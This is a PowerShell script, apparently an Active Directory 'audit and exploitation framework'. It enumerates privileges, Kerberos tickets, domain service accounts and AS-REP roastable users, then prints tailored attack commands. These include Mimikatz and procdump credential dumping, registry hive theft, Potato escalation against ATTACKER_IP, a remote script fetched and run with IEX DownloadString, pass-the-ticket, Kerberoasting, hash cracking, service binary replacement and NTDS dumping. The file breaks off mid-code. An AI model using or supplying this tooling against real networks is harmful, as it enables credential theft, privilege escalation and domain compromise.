# ============================================================================
# NATIVE POWERSHELL SERVICE ACCOUNT AUDIT & EXPLOITATION FRAMEWORK


function Invoke-NativeADExploitAudit {
    [CmdletBinding()]
    param(
        [switch]$FullEnumeration,
        [switch]$GenerateHashes,
        [switch]$ExportToCsv,
        [string]$OutputDirectory = ".\AuditOutput_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    )
    
    $script:StartTime = Get-Date
    $script:Results = @{
        ServiceAccounts = @()
        ASREPUsers = @()
        KerberoastUsers = @()
        DelegationComputers = @()
        PrivilegedUsers = @()
        WeakPasswords = @()
        Processes = @()
        Tickets = @()
    }
    
    # Create output directory
    if ($ExportToCsv -and -not (Test-Path $OutputDirectory)) {
        New-Item -Path $OutputDirectory -ItemType Directory -Force | Out-Null
    }
    
    # Banner
    Write-Host @"
╔════════════════════════════════════════════════════════════════════════════╗
║          NATIVE POWERSHELL AD SECURITY AUDIT FRAMEWORK                     ║
║          Full Enumeration + Exploitation Commands                          ║
║          No External Dependencies Required                                 ║
╚════════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

    Write-Host "`n[*] Audit Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[*] Execution Context: $env:USERDOMAIN\$env:USERNAME @ $env:COMPUTERNAME" -ForegroundColor Gray
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[*] Administrator Rights: $(if($isAdmin){'YES'}else{'NO'})" -ForegroundColor $(if($isAdmin){'Red'}else{'Yellow'})
    
    # Get domain info
    $computerSystem = Get-WmiObject Win32_ComputerSystem
    $domainJoined = $computerSystem.PartOfDomain
    $domain = $computerSystem.Domain
    
    Write-Host "[*] Domain Status: $(if($domainJoined){'Joined to ' + $domain}else{'Workgroup'})" -ForegroundColor $(if($domainJoined){'Green'}else{'Yellow'})
    Write-Host ""
    
    # ========================================================================
    # SECTION 1: LOCAL PRIVILEGE & CREDENTIAL ENUMERATION
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [1] LOCAL PRIVILEGE & CREDENTIAL ENUMERATION                               ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    # Current user privileges
    Write-Host "`n[+] Current User Privileges Analysis:" -ForegroundColor Cyan
    $privOutput = whoami /priv 2>$null
    
    $dangerousPrivs = @{
        'SeDebugPrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Process debugging - LSASS credential dumping'
            Exploits = @(
                'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
                'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID lsass.dmp full'
            )
        }
        'SeTcbPrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Act as part of operating system - Token creation'
            Exploits = @(
                'Can create arbitrary access tokens',
                'Full system compromise possible'
            )
        }
        'SeBackupPrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Backup files and directories - Read any file'
            Exploits = @(
                'reg save HKLM\SAM sam.hive',
                'reg save HKLM\SYSTEM system.hive',
                'reg save HKLM\SECURITY security.hive',
                'impacket-secretsdump -sam sam.hive -system system.hive LOCAL',
                'ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q'
            )
        }
        'SeRestorePrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Restore files and directories - Write any file'
            Exploits = @(
                'copy /y evil.exe "C:\Windows\System32\utilman.exe"',
                'Replace DLL files for DLL hijacking',
                'Modify service binaries'
            )
        }
        'SeImpersonatePrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Impersonate a client after authentication - Potato attacks'
            Exploits = @(
                'PrintSpoofer.exe -i -c powershell',
                'JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *',
                'RoguePotato.exe -r ATTACKER_IP -e cmd.exe -l 9999',
                'GodPotato.exe -cmd "cmd /c whoami"'
            )
        }
        'SeAssignPrimaryTokenPrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Replace process-level token'
            Exploits = @('Token swapping for privilege escalation')
        }
        'SeLoadDriverPrivilege' = @{
            Risk = 'CRITICAL'
            Description = 'Load and unload device drivers - Kernel exploitation'
            Exploits = @(
                'EoPLoadDriver.exe System\CurrentControlSet\MyService driver.sys',
                'Capcom.sys or similar vulnerable driver loading'
            )
        }
        'SeTakeOwnershipPrivilege' = @{
            Risk = 'HIGH'
            Description = 'Take ownership of files or objects'
            Exploits = @(
                'takeown /f C:\Windows\System32\config\SAM',
                'icacls C:\Windows\System32\config\SAM /grant administrators:F'
            )
        }
    }
    
    $enabledPrivileges = @()
    foreach ($priv in $dangerousPrivs.Keys) {
        if ($privOutput -match "$priv\s+.*Enabled") {
            $enabledPrivileges += $priv
            $privInfo = $dangerousPrivs[$priv]
            
            Write-Host "`n  [!] $priv - ENABLED" -ForegroundColor Red
            Write-Host "      Risk Level: $($privInfo.Risk)" -ForegroundColor Red
            Write-Host "      Description: $($privInfo.Description)" -ForegroundColor Yellow
            Write-Host "      Exploitation Commands:" -ForegroundColor White
            
            foreach ($exploit in $privInfo.Exploits) {
                Write-Host "        > $exploit" -ForegroundColor Yellow
            }
        }
    }
    
    if ($enabledPrivileges.Count -eq 0) {
        Write-Host "  [+] No dangerous privileges enabled" -ForegroundColor Green
    } else {
        Write-Host "`n  [!] TOTAL DANGEROUS PRIVILEGES ENABLED: $($enabledPrivileges.Count)" -ForegroundColor Red
    }
    
    # Credential Manager enumeration
    Write-Host "`n[+] Windows Credential Manager Enumeration:" -ForegroundColor Cyan
    Write-Host "  [CREDENTIAL DUMPING COMMANDS]:" -ForegroundColor Red
    Write-Host "    # Method 1: Mimikatz" -ForegroundColor White
    Write-Host "    mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
    Write-Host "    mimikatz.exe `"privilege::debug`" `"vault::cred`" `"exit`"" -ForegroundColor Yellow
    Write-Host "    mimikatz.exe `"privilege::debug`" `"lsadump::cache`" `"exit`"" -ForegroundColor Yellow
    
    Write-Host "`n    # Method 2: VaultCmd (Native)" -ForegroundColor White
    Write-Host "    vaultcmd /listcreds:`"Windows Credentials`" /all" -ForegroundColor Yellow
    Write-Host "    vaultcmd /listcreds:`"Web Credentials`" /all" -ForegroundColor Yellow
    
    Write-Host "`n    # Method 3: PowerShell Credential Access" -ForegroundColor White
    Write-Host @'
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
'@ -ForegroundColor Yellow
    
    Write-Host "`n    # Method 4: Extract from DPAPI" -ForegroundColor White
    Write-Host "    mimikatz.exe `"dpapi::cred /in:C:\Users\[USER]\AppData\Local\Microsoft\Credentials\[GUID]`"" -ForegroundColor Yellow
    
    # Kerberos ticket analysis
    Write-Host "`n[+] Kerberos Ticket Analysis:" -ForegroundColor Cyan
    $ticketOutput = klist 2>$null
    
    if ($LASTEXITCODE -eq 0) {
        $tickets = @()
        $currentTicket = $null
        
        foreach ($line in $ticketOutput -split "`n") {
            if ($line -match "^\s*#(\d+)>\s+Client:\s+(.+)") {
                if ($currentTicket) { $tickets += $currentTicket }
                $currentTicket = @{
                    Number = $matches[1]
                    Client = $matches[2].Trim()
                }
            } elseif ($line -match "^\s+Server:\s+(.+)" -and $currentTicket) {
                $currentTicket.Server = $matches[1].Trim()
            } elseif ($line -match "^\s+KerbTicket Encryption Type:\s+(.+)" -and $currentTicket) {
                $currentTicket.EncType = $matches[1].Trim()
            } elseif ($line -match "^\s+Start Time:\s+(.+)" -and $currentTicket) {
                $currentTicket.StartTime = $matches[1].Trim()
            } elseif ($line -match "^\s+End Time:\s+(.+)" -and $currentTicket) {
                $currentTicket.EndTime = $matches[1].Trim()
            } elseif ($line -match "^\s+Ticket Flags\s+(.+)" -and $currentTicket) {
                $currentTicket.Flags = $matches[1].Trim()
            }
        }
        if ($currentTicket) { $tickets += $currentTicket }
        
        if ($tickets.Count -gt 0) {
            Write-Host "  Found $($tickets.Count) cached Kerberos tickets:" -ForegroundColor Yellow
            
            foreach ($ticket in $tickets) {
                Write-Host "`n  [Ticket #$($ticket.Number)]" -ForegroundColor White
                Write-Host "    Client: $($ticket.Client)" -ForegroundColor Gray
                Write-Host "    Server: $($ticket.Server)" -ForegroundColor Gray
                Write-Host "    Encryption: $($ticket.EncType)" -ForegroundColor Gray
                Write-Host "    Valid: $($ticket.StartTime) - $($ticket.EndTime)" -ForegroundColor Gray
                
                # Check for interesting tickets
                if ($ticket.Server -match 'krbtgt') {
                    Write-Host "    [!] TGT - Can request service tickets!" -ForegroundColor Red
                } elseif ($ticket.Server -match 'cifs|ldap|http|mssql') {
                    Write-Host "    [+] Service ticket - Potential lateral movement" -ForegroundColor Yellow
                }
                
                $script:Results.Tickets += $ticket
            }
            
            Write-Host "`n  [TICKET MANIPULATION COMMANDS]:" -ForegroundColor Red
            
            Write-Host "`n    # Export Tickets (Mimikatz)" -ForegroundColor White
            Write-Host "    mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
            Write-Host "    # Result: [0;xxxxxx]-x-x-x-[service]@[realm]-[domain].kirbi" -ForegroundColor Gray
            
            Write-Host "`n    # Export Tickets (Rubeus)" -ForegroundColor White
            Write-Host "    Rubeus.exe dump /nowrap" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe dump /service:krbtgt /nowrap" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe dump /luid:0x[LUID] /nowrap" -ForegroundColor Yellow
            
            Write-Host "`n    # Pass-the-Ticket (PTT)" -ForegroundColor White
            Write-Host "    mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
            Write-Host "    # Verify: klist" -ForegroundColor Gray
            Write-Host "    # Use: dir \\[target]\C`$" -ForegroundColor Gray
            
            Write-Host "`n    # Ticket Renewal" -ForegroundColor White
            Write-Host "    Rubeus.exe renew /ticket:[base64_ticket]" -ForegroundColor Yellow
            
            Write-Host "`n    # Ticket Purging (Cleanup)" -ForegroundColor White
            Write-Host "    klist purge" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe purge /luid:0x[LUID]" -ForegroundColor Yellow
            
        } else {
            Write-Host "  No cached tickets found" -ForegroundColor Gray
        }
    } else {
        Write-Host "  Unable to enumerate Kerberos tickets" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 2: SERVICE ACCOUNT DEEP DIVE
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [2] SERVICE ACCOUNT DEEP DIVE & CREDENTIAL EXTRACTION                      ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Enumerating All Windows Services:" -ForegroundColor Cyan
    $allServices = Get-CimInstance Win32_Service -Property Name,StartName,State,StartMode,ProcessId,PathName,Description,DisplayName
    
    # Categorize services
    $serviceCategories = @{
        DomainAccount = @()
        LocalAccount = @()
        VirtualAccount = @()
        ManagedServiceAccount = @()
        SystemAccounts = @()
    }
    
    foreach ($svc in $allServices) {
        if (-not $svc.StartName) { continue }
        
        $startName = $svc.StartName
        
        if ($startName -match '^[A-Za-z0-9_-]+\\.+@?') {
            # Domain account format: DOMAIN\user or user@domain.com
            $serviceCategories.DomainAccount += $svc
        } elseif ($startName -match '^\.\\.+' -or ($startName -notmatch '\\' -and $startName -notmatch '@' -and $startName -ne 'LocalSystem')) {
            # Local account format: .\user or just username
            $serviceCategories.LocalAccount += $svc
        } elseif ($startName -match 'NT SERVICE\\') {
            $serviceCategories.VirtualAccount += $svc
        } elseif ($startName -match '\$@') {
            # gMSA or MSA format: account$@domain
            $serviceCategories.ManagedServiceAccount += $svc
        } else {
            $serviceCategories.SystemAccounts += $svc
        }
    }
    
    # Domain Service Accounts - HIGH PRIORITY
    if ($serviceCategories.DomainAccount.Count -gt 0) {
        Write-Host "`n  [!!!] DOMAIN SERVICE ACCOUNTS DETECTED: $($serviceCategories.DomainAccount.Count)" -ForegroundColor Red
        Write-Host "  These accounts pose significant security risks!" -ForegroundColor Red
        
        foreach ($svc in $serviceCategories.DomainAccount) {
            Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
            Write-Host "  ║ Service: $($svc.Name)" -ForegroundColor Yellow
            Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
            
            Write-Host "    Display Name: $($svc.DisplayName)" -ForegroundColor White
            Write-Host "    Account: $($svc.StartName)" -ForegroundColor Red
            Write-Host "    State: $($svc.State)" -ForegroundColor $(if($svc.State -eq 'Running'){'Green'}else{'Gray'})
            Write-Host "    Start Mode: $($svc.StartMode)" -ForegroundColor Gray
            Write-Host "    Binary: $($svc.PathName)" -ForegroundColor Gray
            
            if ($svc.State -eq 'Running' -and $svc.ProcessId -gt 0) {
                Write-Host "    Process ID: $($svc.ProcessId)" -ForegroundColor Gray
                
                try {
                    $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
                    if ($proc) {
                        Write-Host "    Memory Usage: $([math]::Round($proc.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
                        Write-Host "    Handles: $($proc.HandleCount)" -ForegroundColor Gray
                        Write-Host "    Threads: $($proc.Threads.Count)" -ForegroundColor Gray
                    }
                } catch {}
            }
            
            $script:Results.ServiceAccounts += [PSCustomObject]@{
                Name = $svc.Name
                DisplayName = $svc.DisplayName
                Account = $svc.StartName
                State = $svc.State
                ProcessId = $svc.ProcessId
                Path = $svc.PathName
            }
        }
        
        Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
        Write-Host "  ║ CREDENTIAL EXTRACTION METHODOLOGIES                                   ║" -ForegroundColor Red
        Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
        
        Write-Host "`n  [METHOD 1] LSA Secrets Extraction:" -ForegroundColor White
        Write-Host "    Description: Service account passwords stored in LSA Secrets" -ForegroundColor Gray
        Write-Host "    Requirement: SYSTEM or SeBackupPrivilege" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        Write-Host "      # Using Mimikatz (online):" -ForegroundColor White
        Write-Host "      mimikatz.exe `"privilege::debug`" `"token::elevate`" `"lsadump::secrets`" `"exit`"" -ForegroundColor Yellow
        Write-Host "`n      # Using Registry Dump (offline):" -ForegroundColor White
        Write-Host "      reg save HKLM\SECURITY C:\temp\security.hive" -ForegroundColor Yellow
        Write-Host "      reg save HKLM\SYSTEM C:\temp\system.hive" -ForegroundColor Yellow
        Write-Host "      # Transfer to attacking machine" -ForegroundColor Gray
        Write-Host "      impacket-secretsdump -security security.hive -system system.hive LOCAL" -ForegroundColor Yellow
        Write-Host "`n      # Using CrackMapExec:" -ForegroundColor White
        Write-Host "      crackmapexec smb [TARGET] -u [USER] -p [PASS] --lsa" -ForegroundColor Yellow
        Write-Host "      crackmapexec smb [TARGET] -u [USER] -H [NTLM] --lsa" -ForegroundColor Yellow
        
        Write-Host "`n  [METHOD 2] Process Memory Dump:" -ForegroundColor White
        Write-Host "    Description: Extract credentials from running service process" -ForegroundColor Gray
        Write-Host "    Requirement: SeDebugPrivilege or same user context" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Where-Object {$_.State -eq 'Running'} | Select-Object -First 3) {
            Write-Host "      # Service: $($svc.Name) (PID: $($svc.ProcessId))" -ForegroundColor White
            Write-Host "      procdump.exe -accepteula -ma $($svc.ProcessId) $($svc.Name).dmp" -ForegroundColor Yellow
            Write-Host "      # Analyze with Mimikatz:" -ForegroundColor Gray
            Write-Host "      mimikatz.exe `"sekurlsa::minidump $($svc.Name).dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
            Write-Host "      # Or with strings:" -ForegroundColor Gray
            Write-Host "      strings -n 8 $($svc.Name).dmp | findstr /i `"password pass pwd`"" -ForegroundColor Yellow
            Write-Host ""
        }
        
        Write-Host "  [METHOD 3] Service Configuration Query:" -ForegroundColor White
        Write-Host "    Description: View service configuration (may show cleartext in some cases)" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 3) {
            Write-Host "      sc qc `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host "      sc queryex `"$($svc.Name)`"" -ForegroundColor Yellow
        }
        
        Write-Host "`n  [METHOD 4] Token Impersonation:" -ForegroundColor White
        Write-Host "    Description: Steal service account token from running process" -ForegroundColor Gray
        Write-Host "    Requirement: SeImpersonatePrivilege or admin" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        Write-Host "      # Using Incognito:" -ForegroundColor White
        Write-Host "      incognito.exe list_tokens -u" -ForegroundColor Yellow
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            $username = $svc.StartName -replace '^.+\\', ''
            $domain = $svc.StartName -replace '\\.+$', ''
            Write-Host "      incognito.exe execute -c `"$domain\$username`" cmd.exe" -ForegroundColor Yellow
        }
        Write-Host "`n      # Using Invoke-TokenManipulation:" -ForegroundColor White
        Write-Host "      IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
        Write-Host "      Invoke-TokenManipulation -ShowAll | Where-Object {`$_.Domain -ne 'NT AUTHORITY'}" -ForegroundColor Yellow
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            Write-Host "      Invoke-TokenManipulation -ImpersonateUser -Username `"$($svc.StartName)`"" -ForegroundColor Yellow
        }
        
        Write-Host "`n  [METHOD 5] Kerberoasting (if SPN set):" -ForegroundColor White
        Write-Host "    Description: Request TGS for service account and crack offline" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        Write-Host "      # Enumerate SPNs:" -ForegroundColor White
        Write-Host "      setspn -T $domain -Q */*" -ForegroundColor Yellow
        Write-Host "`n      # Request TGS tickets:" -ForegroundColor White
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 3) {
            $username = $svc.StartName -replace '^.+\\', ''
            Write-Host "      Rubeus.exe kerberoast /user:$username /nowrap" -ForegroundColor Yellow
        }
        Write-Host "`n      # Crack hashes:" -ForegroundColor White
        Write-Host "      hashcat -m 13100 -a 0 tickets.txt wordlist.txt --force" -ForegroundColor Yellow
        Write-Host "      john --wordlist=wordlist.txt tickets.txt" -ForegroundColor Yellow
        
        Write-Host "`n  [METHOD 6] Binary Hijacking:" -ForegroundColor White
        Write-Host "    Description: Replace service binary with malicious version" -ForegroundColor Gray
        Write-Host "`n    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            Write-Host "      # Check permissions on service binary:" -ForegroundColor White
            Write-Host "      icacls `"$($svc.PathName -replace '"','')`"" -ForegroundColor Yellow
            Write-Host "      # If writable, replace:" -ForegroundColor White
            Write-Host "      sc stop `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host "      copy /y evil.exe `"$($svc.PathName -replace '"','')`"" -ForegroundColor Yellow
            Write-Host "      sc start `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host ""
        }
        
    } else {
        Write-Host "`n  [+] No domain service accounts found" -ForegroundColor Green
    }
    
    # Other service categories summary
    if ($serviceCategories.LocalAccount.Count -gt 0) {
        Write-Host "`n  [+] Local Service Accounts: $($serviceCategories.LocalAccount.Count)" -ForegroundColor Yellow
    }
    if ($serviceCategories.ManagedServiceAccount.Count -gt 0) {
        Write-Host "  [+] Managed Service Accounts (MSA/gMSA): $($serviceCategories.ManagedServiceAccount.Count)" -ForegroundColor Green
    }
    if ($serviceCategories.VirtualAccount.Count -gt 0) {
        Write-Host "  [+] Virtual Service Accounts: $($serviceCategories.VirtualAccount.Count)" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 3: ACTIVE DIRECTORY LDAP ENUMERATION
    # ========================================================================
    if ($domainJoined) {
        Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║ [3] ACTIVE DIRECTORY LDAP ATTACK SURFACE ENUMERATION                       ║" -ForegroundColor Green
        Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        
        Write-Host "`n[+] Domain: $domain" -ForegroundColor Cyan
        
        # Get domain DN
        $domainDN = "DC=" + ($domain -replace '\.',',DC=')
        Write-Host "[+] Domain DN: $domainDN" -ForegroundColor Gray
        
        # ===== AS-REP ROASTING =====
        Write-Host "`n[+] AS-REP Roastable Accounts (No Kerberos Pre-Authentication):" -ForegroundColor Cyan
        Write-Host "  Description: Accounts vulnerable to AS-REP roasting attack" -ForegroundColor Gray
        Write-Host "  Risk Level: CRITICAL - Offline password cracking possible" -ForegroundColor Red
        
        try {
            # LDAP filter for DONT_REQ_PREAUTH (0x400000 = 4194304)
            $searcher = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@(
                'samaccountname','distinguishedname','pwdlastset',
                'lastlogontimestamp','description','memberof','admincount'
            ))
            
            $asrepUsers = $searcher.FindAll()
            
            if ($asrepUsers.Count -gt 0) {
                Write-Host "`n  [!!!] VULNERABLE ACCOUNTS FOUND: $($asrepUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $asrepUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $dn = $user.Properties['distinguishedname'][0]
                    
                    Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                    Write-Host "  ║ User: $sam" -ForegroundColor Red
                    Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                    
                    Write-Host "    Distinguished Name: $dn" -ForegroundColor Gray
                    
                    # Password age
                    if ($user.Properties['pwdlastset'] -and $user.Properties['pwdlastset'][0]) {
                        try {
                            $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                            $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                            Write-Host "    Password Age: $daysOld days (Last Set: $($pwdDate.ToString('yyyy-MM-dd')))" -ForegroundColor $(if($daysOld -gt 365){'Red'}else{'Yellow'})
                            
                            if ($daysOld -gt 365) {
                                Write-Host "    [!] Password over 1 year old - Higher crack probability!" -ForegroundColor Red
                            }
                        } catch {}
                    }
                    
                    # Last logon
                    if ($user.Properties['lastlogontimestamp'] -and $user.Properties['lastlogontimestamp'][0]) {
                        try {
                            $lastLogon = [datetime]::FromFileTime([int64]$user.Properties['lastlogontimestamp'][0])
                            $daysSince = (New-TimeSpan -Start $lastLogon -End (Get-Date)).Days
                            Write-Host "    Last Activity: $daysSince days ago ($($lastLogon.ToString('yyyy-MM-dd')))" -ForegroundColor Gray
                        } catch {}
                    }
                    
                    # Description
                    if ($user.Properties['description']) {
                        Write-Host "    Description: $($user.Properties['description'][0])" -ForegroundColor Gray
                    }
                    
                    # Admin count
                    if ($user.Properties['admincount'] -and $user.Properties['admincount'][0] -eq 1) {
                        Write-Host "    [!] PRIVILEGED ACCOUNT - AdminCount = 1" -ForegroundColor Red
                    }
                    
                    # Group memberships
                    if ($user.Properties['memberof']) {
                        $adminGroups = $user.Properties['memberof'] | Where-Object { 
                            $_ -match 'Domain Admins|Enterprise Admins|Administrators|Schema Admins|Account Operators|Backup Operators' 
                        }
                        if ($adminGroups) {
                            Write-Host "    [!] HIGH-VALUE TARGET - Privileged Group Member:" -ForegroundColor Red
                            foreach ($grp in $adminGroups) {
                                $grpName = $grp -replace '^CN=([^,]+),.*','$1'
                                Write-Host "      - $grpName" -ForegroundColor Red
                            }
                        }
                    }
                    
                    $script:Results.ASREPUsers += [PSCustomObject]@{
                        Username = $sam
                        DN = $dn
                        PasswordAge = if($daysOld){$daysOld}else{'Unknown'}
                    }
                }
                
                Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                Write-Host "  ║ AS-REP ROASTING ATTACK METHODOLOGY                                    ║" -ForegroundColor Red
                Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                
                Write-Host "`n  [ATTACK METHOD 1] Using Rubeus (Windows):" -ForegroundColor White
                Write-Host "    # Roast all AS-REP roastable users:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe asreproast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe asreproast /format:john /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n    # Target specific users:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 3) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    Rubeus.exe asreproast /user:$sam /format:hashcat /nowrap" -ForegroundColor Yellow
                }
                
                Write-Host "`n    # Output to file:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt" -ForegroundColor Yellow
                
                Write-Host "`n  [ATTACK METHOD 2] Using Impacket (Linux):" -ForegroundColor White
                Write-Host "    # With credentials:" -ForegroundColor Cyan
                Write-Host "    impacket-GetNPUsers $domain/[user]:[pass] -dc-ip [DC_IP] -request -format hashcat" -ForegroundColor Yellow
                Write-Host "    impacket-GetNPUsers $domain/[user]:[pass] -dc-ip [DC_IP] -request -format john" -ForegroundColor Yellow
                
                Write-Host "`n    # Without credentials (usersfile):" -ForegroundColor Cyan
                Write-Host "    # Create users.txt with usernames" -ForegroundColor Gray
                Write-Host "    impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip [DC_IP]" -ForegroundColor Yellow
                
                Write-Host "`n    # Target specific user without password:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    impacket-GetNPUsers $domain/$sam -no-pass -format hashcat -dc-ip [DC_IP]" -ForegroundColor Yellow
                }
                
                Write-Host "`n  [ATTACK METHOD 3] Using PowerShell (Native):" -ForegroundColor White
                Write-Host "    # Request AS-REP for user:" -ForegroundColor Cyan
                Write-Host @'
    Add-Type -AssemblyName System.IdentityModel
    $userName = "[USERNAME]"
    $domain = "[DOMAIN]"
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$userName@$domain"
'@ -ForegroundColor Yellow
                
                Write-Host "`n  [CRACKING METHODOLOGY]:" -ForegroundColor White
                Write-Host "    # Hash Format (Hashcat mode 18200 / John krb5asrep):" -ForegroundColor Cyan
                Write-Host "    `$krb5asrep`$23`$[username]@[DOMAIN]:[hash]`$[data]" -ForegroundColor Gray
                
                Write-Host "`n    # Hashcat Commands:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt" -ForegroundColor Yellow
                Write-Host "    hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt -r rules/best64.rule" -ForegroundColor Yellow
                Write-Host "    hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule" -ForegroundColor Yellow
                Write-Host "    hashcat -m 18200 -a 3 asrep_hashes.txt ?u?l?l?l?l?l?l?d?d  # Mask attack" -ForegroundColor Yellow
                
                Write-Host "`n    # John the Ripper Commands:" -ForegroundColor Cyan
                Write-Host "    john --wordlist=wordlist.txt asrep_hashes.txt" -ForegroundColor Yellow
                Write-Host "    john --wordlist=wordlist.txt --rules asrep_hashes.txt" -ForegroundColor Yellow
                
                Write-Host "`n  [POST-EXPLOITATION]:" -ForegroundColor White
                Write-Host "    # Once password cracked, validate:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    crackmapexec smb [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                }
                Write-Host "`n    # If privileged, dump credentials:" -ForegroundColor Cyan
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --sam" -ForegroundColor Yellow
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --lsa" -ForegroundColor Yellow
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --ntds" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No AS-REP roastable accounts found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating AS-REP users: $_" -ForegroundColor Red
        }
        
        # ===== KERBEROASTING =====
        Write-Host "`n[+] Kerberoastable Accounts (Service Principal Names):" -ForegroundColor Cyan
        Write-Host "  Description: User accounts with SPNs set - vulnerable to Kerberoasting" -ForegroundColor Gray
        Write-Host "  Risk Level: HIGH - Offline password cracking possible" -ForegroundColor Red
        
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@(
                'samaccountname','serviceprincipalname','distinguishedname',
